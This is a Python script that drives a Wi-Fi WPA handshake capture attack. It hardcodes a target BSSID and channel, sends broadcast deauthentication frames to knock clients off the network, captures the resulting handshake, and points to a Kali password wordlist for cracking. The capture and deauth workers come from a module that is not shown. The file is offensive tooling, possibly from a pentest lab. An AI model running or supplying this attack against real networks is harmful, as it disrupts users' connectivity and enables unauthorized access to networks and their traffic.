import os
import time
import threading
from modules.handshake_capture import deauth_worker, capture_worker

bssid = "28:11:EC:AB:19:24"
channel = "3"
interface = "wlan0"
airodump_timeout = 5
deauth_count = 10
deauth_interval = 0.1
target_mac = "FF:FF:FF:FF:FF:FF"
wordlist = "/home/kali/Desktop/pass.txt"

base_capture_dir = "./captures/"
safe_bssid_name = bssid.replace(":", "-")
output_dir = os.path.join(base_capture_dir, safe_bssid_name)
os.makedirs(output_dir, exist_ok=True)
output_prefix = os.path.join(output_dir, "capture")
cap_file = f"{output_prefix}-01.cap"

stop_event = threading.Event()

if __name__ == "__main__":
    print("[*] Starting handshake capture attack...")

    capture_thread = threading.Thread(
        target=capture_worker,
        args=(bssid, channel, interface, airodump_timeout, output_prefix, cap_file, wordlist, stop_event),
        daemon=True
    )

    deauth_thread = threading.Thread(
        target=deauth_worker,
        args=(bssid, target_mac, interface, deauth_count, deauth_interval, stop_event),
        daemon=True
    )

    capture_thread.start()
    time.sleep(2)
    deauth_thread.start()

    try:
        while capture_thread.is_alive():
            capture_thread.join(0.5)
        stop_event.set()
        deauth_thread.join()
    except KeyboardInterrupt:
        stop_event.set()
        capture_thread.join()
        deauth_thread.join()

    print("[*] Handshake module finished.")
